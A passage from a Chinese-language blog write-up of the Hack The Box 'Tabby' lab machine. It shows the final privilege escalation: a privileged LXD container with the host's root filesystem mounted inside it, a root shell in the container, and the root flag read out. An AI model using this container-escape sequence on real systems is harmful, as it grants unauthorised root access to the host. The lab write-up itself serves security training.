class="hljs-built_in">dir</span>, lvm, zfs, ceph) [default=zfs]: <span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br>Would you like to connect to a MAAS server? (<span class="hljs-built_in">yes</span>/no) [default=no]: <br><br>Would you like to create a new <span class="hljs-built_in">local</span> network bridge? (<span class="hljs-built_in">yes</span>/no) [default=<span class="hljs-built_in">yes</span>]: <br><br>What should the new bridge be called? [default=lxdbr0]: <br><br>What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: <br><br>What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: <br><br>Would you like the LXD server to be available over the network? (<span class="hljs-built_in">yes</span>/no) [default=no]: <br><br>Would you like stale cached images to be updated automatically? (<span class="hljs-built_in">yes</span>/no) [default=<span class="hljs-built_in">yes</span>] <br><br>Would you like a YAML <span class="hljs-string">&quot;lxd init&quot;</span> preseed to be printed? (<span class="hljs-built_in">yes</span>/no) [default=no]: <br><br>ash@tabby:~$ lxc image list<br>lxc image list<br>+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+<br>|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |<br>+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+<br>| myimage | 6874271ece3b | no     | alpine v3.19 (20231223_13:24) | x86_64       | CONTAINER | 3.48MB | Dec 23, 2023 at 6:03am (UTC) |<br>+---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+<br>ash@tabby:~$ lxc init myimage ignite -c security.privileged=<span class="hljs-literal">true</span><br>lxc init myimage ignite -c security.privileged=<span class="hljs-literal">true</span><br>Creating ignite<br>ash@tabby:~$ lxc config device add ignite mydevice disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>&lt;ydevice disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>Device mydevice added to ignite<br>ash@tabby:~$ lxc start ignite<br>lxc start ignite<br></code></pre></td></tr></table></figure>

<p>31、至此，执行最后一步，获取到目标靶机下的root的flag信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">ash@tabby:~$ lxc <span class="hljs-built_in">exec</span> ignite /bin/sh<br>lxc <span class="hljs-built_in">exec</span> ignite /bin/sh<br>~ <span class="hljs-comment"># ^[[29;5Rid</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root)<br>~ <span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br><span class="hljs-built_in">cat</span>: can<span class="hljs-string">&#x27;t open &#x27;</span>/root/root.txt<span class="hljs-string">&#x27;: No such file or directory</span><br><span class="hljs-string">~ # ^[[29;5Rcat /root/root.txt</span><br><span class="hljs-string">cat /root/root.txt</span><br><span class="hljs-string">cat: can&#x27;</span>t open <span class="hljs-string">&#x27;/root/root.txt&#x27;</span>: No such file or directory<br>~ <span class="hljs-comment"># ^[[29;5Rcd /root</span><br><span class="hljs-built_in">cd</span> /root<br>~ <span class="hljs-comment"># ^[[29;5Rls</span><br><span class="hljs-built_in">ls</span><br>~ <span class="hljs-comment"># ^[[29;5Rpwd</span><br><span class="hljs-built_in">pwd</span><br>/root<br>~ <span class="hljs-comment"># ^[[29;5Rls</span><br><span class="hljs-built_in">ls</span><br>~ <span class="hljs-comment"># ^[[29;5Rcd cd /mnt/root/</span><br><span class="hljs-built_in">cd</span> <span class="hljs-built_in">cd</span> /mnt/root/<br>/bin/sh: <span class="hljs-built_in">cd</span>: can<span class="hljs-string">&#x27;t cd to cd: No such file or directory</span><br><span class="hljs-string">~ # ^[[29;5Rcd cd /mnt/root/</span><br><span class="hljs-string">cd cd /mnt/root/</span><br><span class="hljs-string">/bin/sh: cd: can&#x27;</span>t <span class="hljs-built_in">cd</span> to <span class="hljs-built_in">cd</span>: No such file or directory<br>~ <span class="hljs-comment"># ^[[29;5Rcd /mnt/root/</span><br><span class="hljs-built_in">cd</span> /mnt/root/<br>/mnt/root <span class="hljs-comment"># ^[[29;13Rls</span><br><span class="hljs-built_in">ls</span><br>bin         etc         lib64       mnt         run         sys<br>boot        home        libx32      opt         sbin        tmp<br>cdrom       lib         lost+found  proc        snap        usr<br>dev         lib32       media       root        srv         var<br>/mnt/root <span class="hljs-comment"># ^[[29;13Rcd root</span><br><span class="hljs-built_in">cd</span> root<br>/mnt/root/root <span class="hljs-comment"># ^[[29;18Rls</span><br><span class="hljs-built_in">ls</span><br>root.txt  snap<br>/mnt/root/root <span class="hljs-comment"># ^[[29;18Rcat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>32a3e0813bf2093db72555e47cfe036a<br>/mnt/root/root <span class="hljs-comment"># ^[[29;18R</span><br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/259</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Tabby-htb-writeup</div>
      <div>https://sh1yan.top/2023/12/19/Tabby-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年12月19日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/12/20/forest-htb-writeup/" title="forest-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">forest-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/18/Blunder-htb-writeup/" title="Blunder-htb-writeup">
                        <span class="hidden-mobile">Blunder-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
